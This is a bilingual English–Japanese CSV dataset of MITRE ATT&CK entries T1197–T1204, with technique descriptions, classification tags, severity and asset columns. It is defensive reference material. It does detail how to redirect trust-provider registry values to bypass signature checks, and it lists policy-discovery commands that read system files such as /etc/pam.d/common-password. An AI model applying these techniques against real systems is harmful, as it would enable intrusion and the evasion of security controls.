T1197,,BITS Jobs,BITSジョブ,"Adversaries may abuse BITS jobs to persistently execute code and perform various background tasks. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM).(Citation: Microsoft COM)(Citation: Microsoft BITS) BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations. The interface to create and manage BITS jobs is accessible through [PowerShell](https://attack.mitre.org/techniques/T1059/001) and the [BITSAdmin](https://attack.mitre.org/software/S0190) tool.(Citation: Microsoft BITS)(Citation: Microsoft BITSAdmin) Adversaries may abuse BITS to download (e.g. [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)), execute, and even clean up after running malicious code (e.g. [Indicator Removal](https://attack.mitre.org/techniques/T1070)). BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls.(Citation: CTU BITS Malware June 2016)(Citation: Mondok Windows PiggyBack BITS May 2007)(Citation: Symantec BITS May 2007) BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).(Citation: PaloAlto UBoatRAT Nov 2017)(Citation: CTU BITS Malware June 2016) BITS upload functionalities can also be used to perform [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).(Citation: CTU BITS Malware June 2016)",攻撃者はBITSジョブを悪用し、コードを永続的に実行したり様々なバックグラウンドタスクを実行したりすることがあります。Windows Background Intelligent Transfer Service (BITS) は、[Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM) を通じて公開される低帯域幅の非同期ファイル転送メカニズムです。(引用元: Microsoft COM)(引用元: Microsoft BITS) BITS は、他のネットワークアプリケーションを中断することなく（利用可能なアイドル帯域幅を使用して）バックグラウンドで動作することを好む、アップデータ、メッセンジャー、その他のアプリケーションで一般的に使用されます。ファイル転送タスクは、1 つ以上のファイル操作のキューを含む BITS ジョブとして実装されます。 BITSジョブの作成・管理インターフェースは、[PowerShell](https://attack.mitre.org/techniques/T1059/001)および[BITSAdmin](https://attack.mitre.org/software/S0190)ツールを通じてアクセス可能です。(引用元: Microsoft BITS)(引用元: Microsoft BITSAdmin) 攻撃者はBITSを悪用し、悪意のあるコードをダウンロード（例：[侵入ツール転送](https://attack.mitre.org/techniques/T1105)）、実行、さらには実行後の痕跡消去（例：[指標削除](https://attack.mitre.org/techniques/T1070)）を行う可能性があります。 BITSタスクはBITSジョブデータベース内に自己完結し、新規ファイルやレジストリ変更を伴わず、ホストファイアウォールで許可されることが多い。(引用: CTU BITS Malware June 2016)(引用: Mondok Windows PiggyBack BITS 2007年5月)(引用: Symantec BITS 2007年5月) BITSによる実行は、長期ジョブの作成（デフォルト最大有効期間は90日、延長可能）や、ジョブ完了時／エラー発生時（システム再起動後を含む）の任意プログラム起動により、持続性確保も可能とする。(引用元: PaloAlto UBoatRAT 2017年11月)(引用元: CTU BITS Malware 2016年6月) BITSアップロード機能は、[代替プロトコルによる情報漏洩](https://attack.mitre.org/techniques/T1048)にも利用される。(引用元: CTU BITS Malware 2016年6月),defense-evasion;persistence,Windows,script_command_execution,stealth,endpoint_execution;network_connectivity;file_storage_access;database_access,specified,Business Workstation;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005;TA0003,attack-pattern--c8e87b83-edbb-48d4-9295-4974897525b7,2018-04-18T17:59:24.739Z,2025-04-16T20:37:20.513Z,,,,
T1198,,SIP and Trust Provider Hijacking,SIPおよび信頼プロバイダーの乗っ取り,"In user mode, Windows Authenticode (Citation: Microsoft Authenticode) digital signatures are used to verify a file's origin and integrity, variables that may be used to establish trust in signed code (ex: a driver with a valid Microsoft signature may be handled as safe). The signature validation process is handled via the WinVerifyTrust application programming interface (API) function, (Citation: Microsoft WinVerifyTrust) which accepts an inquiry and coordinates with the appropriate trust provider, which is responsible for validating parameters of a signature. (Citation: SpectorOps Subverting Trust Sept 2017) Because of the varying executable file types and corresponding signature formats, Microsoft created software components called Subject Interface Packages (SIPs) (Citation: EduardosBlog SIPs July 2008) to provide a layer of abstraction between API functions and files. SIPs are responsible for enabling API functions to create, retrieve, calculate, and verify signatures. Unique SIPs exist for most file formats (Executable, PowerShell, Installer, etc., with catalog signing providing a catch-all (Citation: Microsoft Catalog Files and Signatures April 2017)) and are identified by globally unique identifiers (GUIDs). (Citation: SpectorOps Subverting Trust Sept 2017) Similar to [Code Signing](https://attack.mitre.org/techniques/T1116), adversaries may abuse this architecture to subvert trust controls and bypass security policies that allow only legitimately signed code to execute on a system. Adversaries may hijack SIP and trust provider components to mislead operating system and whitelisting tools to classify malicious (or any) code as signed by: (Citation: SpectorOps Subverting Trust Sept 2017) * Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\SOFTWARE[\WOW6432Node\]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{SIP_GUID}</code> that point to the dynamic link library (DLL) providing a SIP’s CryptSIPDllGetSignedDataMsg function, which retrieves an encoded digital certificate from a signed file. By pointing to a maliciously-crafted DLL with an exported function that always returns a known good signature value (ex: a Microsoft signature for Portable Executables) rather than the file’s real signature, an adversary can apply an acceptable signature value to all files using that SIP (Citation: GitHub SIP POC Sept 2017) (although a hash mismatch will likely occur, invalidating the signature, since the hash returned by the function will not match the value computed from the file). * Modifying the <code>Dll</code> and <code>FuncName</code> Registry values in <code>HKLM\SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{SIP_GUID}</code> that point to the DLL providing a SIP’s CryptSIPDllVerifyIndirectData function, which validates a file’s computed hash against the signed hash value. By pointing to a maliciously-crafted DLL with an exported function that always returns TRUE (indicating that the validation was successful), an adversary can successfully validate any file (with a legitimate signature) using that SIP (Citation: GitHub SIP POC Sept 2017) (with or without hijacking the previously mentioned CryptSIPDllGetSignedDataMsg function). This Registry value could also be redirected to a suitable exported function from an already present DLL, avoiding the requirement to drop and execute a new file on disk. * Modifying the <code>DLL</code> and <code>Function</code> Registry values in <code>HKLM\SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\Providers\Trust\FinalPolicy\{trust provider GUID}</code> that point to the DLL providing a trust provider’s FinalPolicy function, which is where the decoded and parsed signature is checked and the majority of trust decisions are made. Similar to hijacking SIP’s CryptSIPDllVerifyIndirectData function, this value can be redirected to a suitable exported function from an already present DLL or a maliciously-crafted DLL (though the implementation of a trust provider is complex). * **Note:** The above hijacks are also possible without modifying the Registry via [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Hijacking SIP or trust provider components can also enable persistent code execution, since these malicious components may be invoked by any application that performs code signing or signature validation. (Citation: SpectorOps Subverting Trust Sept 2017)",ユーザーモードでは、Windows Authenticode（引用元: Microsoft Authenticode）のデジタル署名を使用して、ファイルの起源と完全性を検証します。これらは署名付きコードへの信頼を確立するために使用される変数です（例: 有効なMicrosoft署名を持つドライバーは安全として扱われる可能性があります）。 署名検証プロセスは、WinVerifyTrustアプリケーションプログラミングインターフェース（API）関数（引用元：Microsoft WinVerifyTrust）を介して処理されます。この関数は照会を受け付け、署名のパラメータ検証を担当する適切な信頼プロバイダーと連携します。 (引用: SpectorOps Subverting Trust 2017年9月) 実行可能ファイルの種類と対応する署名形式が多様であるため、MicrosoftはAPI関数とファイル間の抽象化レイヤーを提供する「Subject Interface Packages（SIPs）」（引用: EduardosBlog SIPs 2008年7月）と呼ばれるソフトウェアコンポーネントを作成しました。SIPsは、API関数が署名の作成、取得、計算、検証を可能にする役割を担います。 ほとんどのファイル形式（実行可能ファイル、PowerShell、インストーラーなど）には固有のSIPが存在し（カタログ署名が一括対応を提供（引用元：Microsoft Catalog Files and Signatures 2017年4月））、これらはグローバルに一意の識別子（GUID）で識別されます。 （引用元：SpectorOps Subverting Trust 2017年9月）[コード署名](https://attack.mitre.org/techniques/T1116)と同様に、攻撃者はこのアーキテクチャを悪用して信頼制御を破壊し、正当に署名されたコードのみをシステム上で実行を許可するセキュリティポリシーを迂回する可能性があります。 攻撃者は、SIP および信頼プロバイダーコンポーネントを乗っ取り、オペレーティングシステムやホワイトリストツールを欺いて、悪意のある（または任意の）コードを以下の署名付きとして分類させることがあります：(引用: SpectorOps Subverting Trust 2017年9月)* <code>HKLM\SOFTWARE[\WOW6432Node\]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllGetSignedDataMsg\{SIP_GUID}</code> を改変し、署名済みファイルからエンコードされたデジタル証明書を取得するSIPのCryptSIPDllGetSignedDataMsg関数を提供するDLLを指すようにする。 悪意を持って作成されたDLLを指すように設定することで、攻撃者は実際のファイル署名ではなく、常に既知の有効な署名値（例：Microsoftのポータブル実行可能ファイル用署名）を返すエクスポート関数を悪用できます。これにより、攻撃者はそのSIPを使用する全ファイルに許容可能な署名値を適用することが可能となります （引用元: GitHub SIP POC 2017年9月）（ただし、関数が返すハッシュ値はファイルから計算された値と一致しないため、ハッシュ不一致が発生し署名が無効化される可能性が高い）。* <code>HKLM\SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{SIP_GUID}</code> 内の<code>Dll</code>および<code>FuncName</code>レジストリ値を変更する。これらはSIPのCryptSIPDllVerifyIndirectData関数を提供するDLLを指し、この関数はファイルの計算済みハッシュ値と署名付きハッシュ値を検証する。 悪意を持って作成されたDLL（常にTRUEを返すエクスポート関数を持つ）を指すように設定することで、攻撃者は（前述のCryptSIPDllGetSignedDataMsg関数の乗っ取りの有無にかかわらず）そのSIPを使用して（正当な署名を持つ）任意のファイルの検証を成功させることが可能となります（出典: GitHub SIP POC Sept 2017）。 このレジストリ値は、既存のDLLから適切なエクスポート関数へリダイレクトすることも可能であり、ディスク上に新規ファイルをドロップ・実行する要件を回避できる。* <code>HKLM\SOFTWARE\[WOW6432Node\]Microsoft\Cryptography\Providers\Trust\FinalPolicy\{トラストプロバイダーGUID}</code>内の<code>DLL</code>および<code>Function</code>レジストリ値を変更する。これらはトラストプロバイダーのFinalPolicy関数を提供するDLLを指しており、ここで復号化・解析された署名が検証され、信頼判断の大部分が行われる。 SIPのCryptSIPDllVerifyIndirectData関数のハイジャックと同様に、この値は既存のDLLまたは悪意を持って作成されたDLLから適切なエクスポート関数へリダイレクト可能です（ただし信頼プロバイダーの実装は複雑です）。* **注記:** 上記のハイジャックは、レジストリを変更せずに[DLL検索順序ハイジャック](https://attack.mitre.org/techniques/T1038)によっても実現可能です。SIPや信頼プロバイダーコンポーネントのハイジャックは、コード署名や署名検証を行うあらゆるアプリケーションからこれらの悪意あるコンポーネントが呼び出される可能性があるため、永続的なコード実行を可能にする場合もあります。（引用元: SpectorOps Subverting Trust 2017年9月）,defense-evasion;persistence,Windows,script_command_execution,stealth,user_interaction;endpoint_execution;cloud_control_plane;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005;TA0003,attack-pattern--72b5ef57-325c-411b-93ca-a3ca6fa17e31,2018-04-18T17:59:24.739Z,2025-04-25T15:15:43.741Z,,,,
T1199,,Trusted Relationship,信頼関係,"Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network. Organizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, [Valid Accounts](https://attack.mitre.org/techniques/T1078) used by the other party for access to internal network systems may be compromised and used.(Citation: CISA IT Service Providers) In Office 365 environments, organizations may grant Microsoft partners or resellers delegated administrator permissions. By compromising a partner or reseller account, an adversary may be able to leverage existing delegated administrator relationships or send new delegated administrator offers to clients in order to gain administrative control over the victim tenant.(Citation: Office 365 Delegated Administration)",攻撃者は、標的となる被害者にアクセス権を持つ組織を侵害または悪用する可能性があります。 信頼された第三者関係を通じたアクセスは、保護されていない、またはネットワークへの標準的なアクセス手段よりも監視が緩い既存の接続を悪用する。組織は、内部システムやクラウド環境を管理させるため、外部プロバイダー（二次・三次）に昇格アクセスを許可することが多い。こうした関係の一例として、ITサービス請負業者、マネージドセキュリティプロバイダー、インフラ請負業者（例：空調設備、エレベーター、物理的セキュリティ）が挙げられる。 第三者プロバイダーのアクセス権限は、保守対象のインフラに限定される意図であっても、企業ネットワーク全体と同一ネットワーク上に存在する可能性があります。そのため、相手側が内部ネットワークシステムへのアクセスに使用する[有効なアカウント](https://attack.mitre.org/techniques/T1078)が侵害され悪用される恐れがあります。(引用元: CISA ITサービスプロバイダー) Office 365環境では、組織がマイクロソフトパートナーや再販業者に委任管理者権限を付与する場合がある。パートナーや再販業者のアカウントを侵害することで、攻撃者は既存の委任管理者関係を悪用したり、新たな委任管理者権限の提案をクライアントに送信したりして、被害テナントの管理権限を獲得できる可能性がある。(引用元: Office 365委任管理),initial-access,Windows;SaaS;IaaS;Linux;macOS;Identity Provider;Office Suite,other,entry,privileged_account;network_connectivity;email_infrastructure;cloud_control_plane;saas_in_use,specified,Business Workstation;Identity / SaaS (IdP/SSO);Mail / Collaboration;Management Console for GovCloud;Server (On-Prem/VM),has_created_ts;has_modified_ts,S1,S1,C01,Initial Access,C01,Initial Access,TA0001,attack-pattern--9fa07bef-9c81-421e-a8e5-ad4366c5a925,2018-04-18T17:59:24.739Z,2025-04-15T23:17:12.008Z,,,,
T1200,,Hardware Additions,ハードウェア追加,"Adversaries may physically introduce computer accessories, networking hardware, or other computing devices into a system or network that can be used as a vector to gain access. Rather than just connecting and distributing payloads via removable storage (i.e. [Replication Through Removable Media](https://attack.mitre.org/techniques/T1091)), more robust hardware additions can be used to introduce new functionalities and/or features into a system that can then be abused. While public references of usage by threat actors are scarce, many red teams/penetration testers leverage hardware additions for initial access. Commercial and open source products can be leveraged with capabilities such as passive network tapping, network traffic modification (i.e. [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)), keystroke injection, kernel memory reading via DMA, addition of new wireless access points to an existing network, and others.(Citation: Ossmann Star Feb 2011)(Citation: Aleks Weapons Nov 2015)(Citation: Frisk DMA August 2016)(Citation: McMillan Pwn March 2012)",攻撃者は、アクセス手段として利用可能なコンピュータ周辺機器、ネットワーク機器、その他のコンピューティングデバイスを物理的にシステムやネットワークに導入する可能性があります。 リムーバブルストレージを介した接続やペイロード配布（例：[リムーバブルメディアを介した複製](https://attack.mitre.org/techniques/T1091)）だけでなく、より堅牢なハードウェア追加により、悪用可能な新機能や特徴をシステムに導入することが可能です。 脅威アクターによる使用例は公にはほとんど報告されていないが、多くのレッドチーム/ペネトレーションテスターが初期アクセス手段としてハードウェア追加を活用している。 商用製品やオープンソース製品を活用することで、パッシブネットワークタッピング、ネットワークトラフィック改ざん（例：[中間者攻撃](https://attack.mitre.org/techniques/T1557)）、キーストローク注入、DMA経由のカーネルメモリ読み取り、既存ネットワークへの新規無線アクセスポイント追加などの機能が実現可能です。(引用: Ossmann Star 2011年2月号)(引用: Aleks Weapons 2015年11月号)(引用: Frisk DMA 2016年8月号)(引用: McMillan Pwn 2012年3月号),initial-access,Windows;Linux;macOS,other,entry,authentication_system;network_connectivity;file_storage_access,specified,Business Workstation;Server (On-Prem/VM);Wireless Access Point,has_created_ts;has_modified_ts,S1,S1,C01,Initial Access,C01,Initial Access,TA0001,attack-pattern--d40239b3-05ff-46d8-9bdd-b46d13463ef9,2018-04-18T17:59:24.739Z,2025-04-15T19:59:11.434Z,,,,
T1201,,Password Policy Discovery,パスワードポリシーの発見,"Adversaries may attempt to access detailed information about the password policy used within an enterprise network or cloud environment. Password policies are a way to enforce complex passwords that are difficult to guess or crack through [Brute Force](https://attack.mitre.org/techniques/T1110). This information may help the adversary to create a list of common passwords and launch dictionary and/or brute force attacks which adheres to the policy (e.g. if the minimum password length should be 8, then not trying passwords such as 'pass123'; not checking for more than 3-4 passwords per account if the lockout is set to 6 as to not lock out accounts). Password policies can be set and discovered on Windows, Linux, and macOS systems via various command shell utilities such as <code>net accounts (/domain)</code>, <code>Get-ADDefaultDomainPasswordPolicy</code>, <code>chage -l <username></code>, <code>cat /etc/pam.d/common-password</code>, and <code>pwpolicy getaccountpolicies</code> (Citation: Superuser Linux Password Policies) (Citation: Jamf User Password Policies). Adversaries may also leverage a [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) on network devices to discover password policy information (e.g. <code>show aaa</code>, <code>show aaa common-criteria policy all</code>).(Citation: US-CERT-TA18-106A) Password policies can be discovered in cloud environments using available APIs such as <code>GetAccountPasswordPolicy</code> in AWS (Citation: AWS GetPasswordPolicy).",攻撃者は、企業ネットワークやクラウド環境内で使用されているパスワードポリシーに関する詳細情報へのアクセスを試みる可能性がある。パスワードポリシーは、推測や[ブルートフォース](https://attack.mitre.org/techniques/T1110)による解読が困難な複雑なパスワードを強制する手段である。 この情報は、攻撃者が一般的なパスワードのリストを作成し、ポリシーに準拠した辞書攻撃やブルートフォース攻撃を仕掛けるのに役立つ可能性があります（例：パスワードの最小長が8文字の場合、「pass123」のようなパスワードを試さない；ロックアウトが6回に設定されている場合、アカウントをロックアウトしないよう、1アカウントあたり3～4回以上のパスワードチェックを行わない）。 パスワードポリシーは、Windows、Linux、macOSシステムにおいて、<code>net accounts (/domain)</code>、<code>Get-ADDefaultDomainPasswordPolicy</code>、<code>chage -l <username></code>、<code>cat /etc/pam.d/common-password</code>、<code>pwpolicy getaccountpolicies</code>などの各種コマンドシェルユーティリティを通じて設定および確認できます。 （引用元: Superuser Linux Password Policies）（引用元: Jamf User Password Policies）。 攻撃者はネットワーク機器上の[ネットワーク機器CLI](https://attack.mitre.org/techniques/T1059/008)を利用してパスワードポリシー情報を発見する可能性もあります（例：<code>show aaa</code>、<code>show aaa common-criteria policy all</code>）。(引用: US-CERT-TA18-106A) クラウド環境では、AWS の <code>GetAccountPasswordPolicy</code> などの利用可能な API を使用してパスワードポリシーを調査することができます (引用: AWS GetPasswordPolicy)。,discovery,Windows;Linux;macOS;IaaS;Network Devices;Identity Provider;SaaS;Office Suite,credential_abuse,situational_awareness,authentication_system;user_interaction;endpoint_execution;endpoint_management;network_connectivity;cloud_control_plane,specified,Business Workstation;Identity / SaaS (IdP/SSO);Management Console for GovCloud;Network Device (FW/Proxy/AP);Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0007,attack-pattern--b6075259-dba3-44e9-87c7-e954f37ec0d5,2018-04-18T17:59:24.739Z,2025-04-15T19:59:00.168Z,,,,
T1202,,Indirect Command Execution,間接的なコマンド実行,"Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters. Various Windows utilities may be used to execute commands, possibly without invoking [cmd](https://attack.mitre.org/software/S0106). For example, [Forfiles](https://attack.mitre.org/software/S0193), the Program Compatibility Assistant (`pcalua.exe`), components of the Windows Subsystem for Linux (WSL), `Scriptrunner.exe`, as well as other utilities may invoke the execution of programs and commands from a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), Run window, or via scripts.(Citation: VectorSec ForFiles Aug 2017)(Citation: Evi1cg Forfiles Nov 2017)(Citation: Secure Team - Scriptrunner.exe)(Citation: SS64)(Citation: Bleeping Computer - Scriptrunner.exe) Adversaries may also abuse the `ssh.exe` binary to execute malicious commands via the `ProxyCommand` and `LocalCommand` options, which can be invoked via the `-o` flag or by modifying the SSH config file.(Citation: Threat Actor Targets the Manufacturing industry with Lumma Stealer and Amadey Bot) Adversaries may abuse these features for [Defense Evasion](https://attack.mitre.org/tactics/TA0005), specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of [cmd](https://attack.mitre.org/software/S0106) or file extensions more commonly associated with malicious payloads.",攻撃者は、コマンドラインインタプリタの使用を制限するセキュリティ制限を回避するために、コマンド実行を可能にするユーティリティを悪用する可能性があります。さまざまなWindowsユーティリティを使用してコマンドを実行でき、[cmd](https://attack.mitre.org/software/S0106)を呼び出さずに実行できる可能性があります。 例えば、[Forfiles](https://attack.mitre.org/software/S0193)、プログラム互換性アシスタント（`pcalua.exe`）、Windows Subsystem for Linux（WSL）のコンポーネント、 `Scriptrunner.exe`、その他のユーティリティは、[コマンドとスクリプトのインタープリター](https://attack.mitre.org/techniques/T1059)、実行ウィンドウ、またはスクリプト経由でプログラムやコマンドの実行を呼び出す可能性があります。(引用元: VectorSec ForFiles 2017年8月)(引用元: Evi1cg Forfiles 2017年11月)(引用元: Secure Team - Scriptrunner.exe)(引用元: SS64)(引用元: Bleeping Computer - Scriptrunner.exe) 攻撃者はまた、`ssh.exe`バイナリを悪用し、`-o`フラグまたはSSH設定ファイルの改変により呼び出せる`ProxyCommand`および`LocalCommand`オプションを介して悪意のあるコマンドを実行する可能性があります。(引用元: Threat Actor Targets the Manufacturing industry with Lumma Stealer and Amadey Bot) 攻撃者は、これらの機能を悪用して [防御回避](https://attack.mitre.org/tactics/TA0005) を行うために悪用する可能性があります。具体的には、[cmd](https://attack.mitre.org/software/S0106) や悪意のあるペイロードに関連付けられることが多いファイル拡張子の使用を制限/防止する検出や緩和策（グループポリシーなど）を回避しながら、任意の実行を実行します。,defense-evasion,Windows,remote_service_abuse,stealth,authentication_system;endpoint_execution;endpoint_management;network_connectivity;cloud_control_plane;file_storage_access,specified,Business Workstation;Proxy / Gateway;Server (On-Prem/VM),has_created_ts;has_modified_ts,S2,S2,C02,Secondary Action,C02,Secondary Action,TA0005,attack-pattern--3b0e52ce-517a-4614-a523-1bd5deef6c5e,2018-04-18T17:59:24.739Z,2025-04-15T19:58:23.859Z,,,,
T1203,,Exploitation for Client Execution,クライアント実行のための悪用,"Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility. Several types exist: ### Browser-based Exploitation Web browsers are a common target through [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) and [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002). Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed. ### Office Applications Common office and productivity applications such as Microsoft Office are also targeted through [Phishing](https://attack.mitre.org/techniques/T1566). Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run. ### Common Third-party Applications Other applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.",攻撃者はクライアントアプリケーションのソフトウェア脆弱性を悪用してコードを実行する可能性があります。ソフトウェアには、予期せぬ動作を引き起こす可能性のある安全でないコーディング慣行に起因する脆弱性が存在する可能性があります。 攻撃者は、任意のコード実行を目的として、標的型攻撃により特定の脆弱性を悪用する可能性があります。攻撃ツールキットにおいて最も価値のあるエクスプロイトは、多くの場合、リモートシステムへのコード実行権限を取得できるものであり、それによりシステムへのアクセス権を獲得できるためです。ユーザーは、業務で頻繁に使用するアプリケーションに関連するファイルを目にすることを期待するため、その実用性の高さから、エクスプロイトの研究開発において有用な標的となります。 いくつかの種類が存在します：### ブラウザベースの悪用Webブラウザは、[ドライブバイ攻撃](https://attack.mitre.org/techniques/T1189)や[標的型フィッシングリンク](https://attack.mitre.org/techniques/T1566/002)を通じた一般的な標的です。 エンドポイントシステムは、通常のウェブ閲覧や、特定のユーザーが標的型フィッシングメール内のリンクから攻撃者が制御するサイトに誘導され、ウェブブラウザを悪用されることで侵害される可能性があります。多くの場合、エクスプロイトの実行にユーザーの操作は不要です。### オフィスアプリケーションMicrosoft Officeなどの一般的なオフィスアプリケーションや生産性アプリケーションも、[フィッシング](https://attack.mitre.org/techniques/T1566)を通じて標的となります。 悪意のあるファイルは添付ファイルとして直接送信されるか、ダウンロードリンクを介して配布されます。これらはユーザーが文書やファイルを開くことでエクスプロイトが実行されます。### 一般的なサードパーティ製アプリケーション標的ネットワークに展開されているソフトウェアの一部として、あるいは一般的に見られるその他のアプリケーションも悪用される可能性があります。 企業環境で一般的なAdobe ReaderやFlashなどのアプリケーションは、システムへのアクセスを試みる攻撃者によって日常的に標的とされています。ソフトウェアや脆弱性の性質によっては、ブラウザ上で悪用される場合もあれば、ユーザーがファイルを開く必要がある場合もあります。例えば、一部のFlashエクスプロイトはMicrosoft Office文書内のオブジェクトとして配信されています。,execution,Linux;Windows;macOS,data_collection,foothold,user_interaction;endpoint_execution;network_connectivity;email_infrastructure;file_storage_access,specified,Business Workstation;Mail / Collaboration;Server (On-Prem/VM),has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0002,attack-pattern--be2dcee9-a7a7-4e38-afd6-21b31ecc3d63,2018-04-18T17:59:24.739Z,2025-04-15T19:59:03.090Z,,,,
T1204,,User Execution,ユーザー実行,"An adversary may rely upon specific actions by a user in order to gain execution. Users may be subjected to social engineering to get them to execute malicious code by, for example, opening a malicious document file or link. These user actions will typically be observed as follow-on behavior from forms of [Phishing](https://attack.mitre.org/techniques/T1566). While [User Execution](https://attack.mitre.org/techniques/T1204) frequently occurs shortly after Initial Access it may occur at other phases of an intrusion, such as when an adversary places a file in a shared directory or on a user's desktop hoping that a user will click on it. This activity may also be seen shortly after [Internal Spearphishing](https://attack.mitre.org/techniques/T1534). Adversaries may also deceive users into performing actions such as: * Enabling [Remote Access Tools](https://attack.mitre.org/techniques/T1219), allowing direct control of the system to the adversary * Running malicious JavaScript in their browser, allowing adversaries to [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)s(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023) * Downloading and executing malware for [User Execution](https://attack.mitre.org/techniques/T1204) * Coerceing users to copy, paste, and execute malicious code manually(Citation: Reliaquest-execution)(Citation: proofpoint-selfpwn) For example, tech support scams can be facilitated through [Phishing](https://attack.mitre.org/techniques/T1566), vishing, or various forms of user interaction. Adversaries can use a combination of these methods, such as spoofing and promoting toll-free numbers or call centers that are used to direct victims to malicious websites, to deliver and execute payloads containing malware or [Remote Access Tools](https://attack.mitre.org/techniques/T1219).(Citation: Telephone Attack Delivery)",攻撃者は、実行権限を得るためにユーザーの特定の行動に依存する場合があります。ユーザーは、例えば悪意のある文書ファイルやリンクを開かせるなど、ソーシャルエンジニアリングによって悪意のあるコードを実行させられる可能性があります。こうしたユーザー行動は、通常、[フィッシング](https://attack.mitre.org/techniques/T1566)の手法に続く行動として観察されます。 [ユーザー実行](https://attack.mitre.org/techniques/T1204) は初期アクセス直後に発生することが多いが、侵入の他の段階でも発生する可能性がある。例えば、攻撃者が共有ディレクトリやユーザーのデスクトップにファイルを配置し、ユーザーがクリックすることを期待する場合などである。 この活動は、[内部スピアフィッシング](https://attack.mitre.org/techniques/T1534)直後にも見られることがある。 攻撃者はユーザーを欺き、以下のような行動を実行させることもあります：* [リモートアクセスツール](https://attack.mitre.org/techniques/T1219)を有効化させ、システムを直接制御させる* ブラウザで悪意のあるJavaScriptを実行させ、[Webセッションクッキー](https://attack.mitre.org/techniques/T1539)を窃取させる(引用: Talos Roblox Scam 2023)(引用: Krebs Discord Bookmarks 2023)* [ユーザー実行](https://attack.mitre.org/techniques/T1204) 目的のマルウェアをダウンロード・実行させる * ユーザーに悪意のあるコードを手動でコピー、貼り付け、実行させる（引用元：Reliaquest-execution）（引用元：proofpoint-selfpwn）例えば、テクニカルサポート詐欺は[フィッシング](https://attack.mitre.org/techniques/T1566)、ボイスフィッシング、または様々なユーザー操作を通じて促進される可能性があります。 攻撃者はこれらの手法を組み合わせて使用することが可能であり、例えば、被害者を悪意のあるウェブサイトへ誘導するために使用されるフリーダイヤル番号やコールセンターを偽装・宣伝することで、マルウェアや[遠隔アクセスツール](https://attack.mitre.org/techniques/T1219)を含むペイロードを配信・実行する。(引用: Telephone Attack Delivery),execution,Linux;Windows;macOS;IaaS;Containers,credential_abuse,foothold,authentication_system;user_interaction;endpoint_execution;network_connectivity;file_storage_access,specified,Business Workstation;File Server;Server (On-Prem/VM),has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0002,attack-pattern--8c32eb4d-805f-4fc5-bf60-c4d476c131b5,2018-04-18T17:59:24.739Z,2025-04-15T19:58:49.690Z,,,,
